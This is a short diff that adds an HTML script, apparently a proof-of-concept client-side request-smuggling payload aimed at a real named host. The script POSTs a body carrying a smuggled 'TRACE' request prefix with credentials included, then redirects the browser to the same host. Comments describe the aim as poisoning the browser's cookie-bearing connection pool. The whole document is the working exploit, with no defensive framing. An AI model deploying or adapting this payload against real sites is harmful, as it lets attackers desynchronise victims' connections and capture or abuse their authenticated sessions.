@@ -1,0 +1,8 @@
+<script>fetch('https://dnfcity.qq.com/robots.txt', {
+  method: 'POST',
+     body: "TRACE / HTTP/1.1\r\nx: y", // malicious prefix
+     mode: 'cors', // ensure connection ID is visible
+     credentials: 'include' // poison 'with-cookies' pool
+}).catch(() => {
+        location = 'https://dnfcity.qq.com/xxxx'
+})</script>
